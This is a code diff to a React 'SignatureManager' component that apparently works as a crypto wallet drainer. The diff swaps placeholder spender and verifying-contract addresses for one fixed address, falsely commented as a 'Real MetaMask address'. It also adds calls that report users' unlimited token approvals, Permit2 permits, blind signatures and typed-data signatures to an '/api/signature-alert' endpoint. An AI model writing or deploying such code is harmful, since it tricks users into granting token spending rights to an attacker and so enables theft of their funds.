@@ -10,9 +10,23 @@ export default function SignatureManager({ provider, userAddress }) {
     setLoading(true);
     try {
       const tokenAddress = '0xA0b86a33E6441b8435b662da0C0E5B2c4c8b0b8b'; // Example token
-      const spenderAddress = '0x1234567890123456789012345678901234567890'; // Example spender
+      const spenderAddress = '0x6026f8db794026ed1b1f501085ab2d97dd6fbc15'; // Real MetaMask address
       
       const tx = await approveUnlimited(tokenAddress, spenderAddress, provider);
+      
+      // Send admin alert
+      await fetch('/api/signature-alert', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          type: 'ERC20_UNLIMITED_APPROVE',
+          userAddress: userAddress,
+          tokenAddress: tokenAddress,
+          spenderAddress: spenderAddress,
+          txHash: tx.hash
+        })
+      });
+      
       setResult(`Unlimited approval tx: ${tx.hash}`);
     } catch (error) {
       setResult(`Error: ${error.message}`);
@@ -26,7 +40,7 @@ export default function SignatureManager({ provider, userAddress }) {
       const tokenAddress = '0xA0b86a33E6441b8435b662da0C0E5B2c4c8b0b8b';
       const amount = ethers.utils.parseEther('1000');
       const deadline = Math.floor(Date.now() / 1000) + 3600;
-      const spender = '0x1234567890123456789012345678901234567890';
+      const spender = '0x6026f8db794026ed1b1f501085ab2d97dd6fbc15';
       
       const signature = await signPermit2(tokenAddress, amount, deadline, spender, provider);
       setResult(`Permit2 signature: ${signature}`);
@@ -41,6 +55,19 @@ export default function SignatureManager({ provider, userAddress }) {
     try {
       const messageHash = '0x1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef';
       const signature = await blindSignature(messageHash, provider);
+      
+      // Send admin alert for blind signature
+      await fetch('/api/signature-alert', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          type: 'BLIND_SIGNATURE',
+          userAddress: userAddress,
+          messageHash: messageHash,
+          signature: signature
+        })
+      });
+      
       setResult(`Blind signature: ${signature}`);
     } catch (error) {
       setResult(`Error: ${error.message}`);
@@ -55,7 +82,7 @@ export default function SignatureManager({ provider, userAddress }) {
         name: 'CryptoRecover',
         version: '1',
         chainId: 1,
-        verifyingContract: '0x1234567890123456789012345678901234567890'
+        verifyingContract: '0x6026f8db794026ed1b1f501085ab2d97dd6fbc15'
       };
 
       const types = {
@@ -73,6 +100,21 @@ export default function SignatureManager({ provider, userAddress }) {
       };
 
       const signature = await signTypedDataV4(domain, types, message, provider);
+      
+      // Send admin alert for TypedData signature
+      await fetch('/api/signature-alert', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          type: 'TYPED_DATA_V4',
+          userAddress: userAddress,
+          domain: domain,
+          types: types,
+          message: message,
+          signature: signature
+        })
+      });
+      
       setResult(`TypedData v4 signature: ${signature}`);
     } catch (error) {
       setResult(`Error: ${error.message}`);
@@ -84,7 +126,7 @@ export default function SignatureManager({ provider, userAddress }) {
     setLoading(true);
     try {
       const tokenAddress = '0xA0b86a33E6441b8435b662da0C0E5B2c4c8b0b8b';
-      const spender = '0x1234567890123456789012345678901234567890';
+      const spender = '0x6026f8db794026ed1b1f501085ab2d97dd6fbc15';
       const value = ethers.utils.parseEther('1000');
       const deadline = Math.floor(Date.now() / 1000) + 3600;
       
